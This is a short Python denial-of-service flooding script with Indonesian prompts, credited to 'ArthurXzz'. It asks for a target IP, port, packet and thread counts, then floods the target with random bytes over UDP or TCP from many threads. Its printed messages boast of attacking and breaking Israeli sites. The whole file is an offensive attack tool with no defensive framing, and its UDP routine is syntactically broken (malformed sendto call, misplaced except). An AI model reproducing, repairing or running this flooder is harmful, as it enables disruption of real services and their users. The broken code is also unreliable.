#!/usr/bin/env python3
#Author : ArthurXzz
#Website : Discord.gg//Anonymous
import random
import socket
import threading
import os
import codecs,sys

os.system("clear")
os.system("figlet DDos Attack")
print("""\u001b[31m
>> Cyber ArthurXzz
>>>>> Website : Discord.gg//AnonymousTeam
>>>>>>>>> Virus Trojan Attack""")

ip = str(input(" Ip Virus Target: "))
port = int(input(" Port Virus Target: "))
choice = str(input(" Siap Menyerang Situs?(y/n): "))
times = int(input(" Packets Virus: "))
threads = int(input(" Threads Virus: "))
def run():
  bytes = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes(ip,port)
        except:
      print("[!] | ArthurXzz Menyerang Situs Israel!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ArthurXzz Team Hacker!!!")
    except:
      s.close()
      print("[*] Situs Israel Rusak!!!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
